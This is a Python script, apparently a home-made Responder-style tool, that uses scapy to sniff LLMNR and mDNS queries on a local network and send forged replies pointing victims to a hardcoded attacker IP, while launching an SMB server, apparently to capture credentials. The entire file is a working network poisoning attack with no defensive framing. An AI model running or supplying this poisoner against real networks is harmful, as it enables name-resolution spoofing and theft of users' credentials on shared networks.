#!/usr/bin/env python
# -*- coding: utf-8 -*-


from scapy.all import *
import threading
from server import startSMBServer
import time
from functools import partial

targets = []


def mostrar(pkt):
    if pkt.haslayer(LLMNRQuery):
        # pkt.show()
        response = Ether(dst=pkt[Ether].src, src="00:50:56:c0:00:08")
        if IP in pkt:
            response /= IP(dst=pkt[IP].src)
            response /= UDP(sport=5355, dport=pkt[UDP].sport)
        elif IPv6 in pkt:
            response /= IPv6(dst=pkt[IPv6].src)
            response /= UDP(sport=5355, dport=pkt[UDP].sport)
        response /= LLMNRResponse(
            id=pkt[LLMNRQuery].id,
            rcode="ok",
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=0,
            qd=pkt[LLMNRQuery].qd,
            an=dnsPackLLMNR(pkt),
            ns=None,
            ar=None,
        )
        sendp(response)
        # print("Enviado")
        # print(response.show())


def dnsPackLLMNR(pkt):
    return DNSRR(
        rrname=pkt[LLMNRQuery].qd.qname,
        type="A",
        rclass="IN",
        ttl=30,
        rdlen=None,
        rdata="192.168.253.132",
    )


def LLMNRPoison():
    print("Starting LLMNR poisoner...")
    sniff(filter="udp and port 5355", iface="ens33", prn=mostrar, store=0)


def dnsPackMDNS(pkt, ip):
    return DNSRR(
        rrname=pkt[DNS].qd.qname, type="A", rclass="IN", ttl=120, rdlen=None, rdata=ip
    )


def mostrarMdns(ipv6, ip, ether, pkt):
    if pkt.haslayer(DNS):
        response = Ether(dst=pkt[Ether].src, src=ether)
        if IP in pkt:
            if pkt[IP].src == ip:
                return
            response /= IP(dst=pkt[IP].src)
            ipSrc = pkt[IP].src
        elif IPv6 in pkt:
            if pkt[IPv6].src == ipv6:
                return
            response /= IPv6(dst=pkt[IPv6].src)
            ipSrc = pkt[IPv6].src
        response /= UDP(sport="mdns", dport="mdns")
        response /= DNS(
            id=pkt[DNS].id,
            qr=1,
            opcode="QUERY",
            aa=1,
            rd=0,
            rcode="ok",
            qdcount=0,
            ancount=1,
            nscount=0,
            arcount=0,
            qd=None,
            an=dnsPackMDNS(pkt, ip),
            ns=None,
            ar=None,
        )
        if ipSrc not in targets:
            print("Sendin packet to " + ipSrc)
            sendp(response, verbose=False)
            targets.append(ip)


def mdnsPoison(ipv6, ip, ether, iface):
    # 5353
    print("Starting MDNSPoisoner...")
    sniff(
        filter="udp and port mdns",
        iface=iface,
        prn=partial(mostrarMdns, ipv6, ip, ether),
        store=0,
    )


def cleaner():
    print("Empezando sleeper...")
    while True:
        time.sleep(3)
        targets.clear()


def startPoison():
    try:
        ipv6 = "fe80::250:56ff:fec0:8"
        ip = "192.168.253.1"
        ether = "00:50:56:c0:00:08"
        iface = "vmnet8"

        MDNSPoison = threading.Thread(target=mdnsPoison, args=(ipv6, ip, ether, iface))
        MDNSPoison.daemon = True
        MDNSPoison.start()
        server = threading.Thread(target=startSMBServer)
        server.daemon = True
        server.start()
        sleeper = threading.Thread(target=cleaner)
        sleeper.daemon = True
        sleeper.start()

        # poisonLLMNR = threading.Thread(target=LLMNRPoison)
        # poisonLLMNR.start()
        # poisonLLMNR.join()
        server.join()
        MDNSPoison.join()
        sleeper.join()
    except KeyboardInterrupt:
        print("Saliendo ...")


# mdnsPoison()
startPoison()
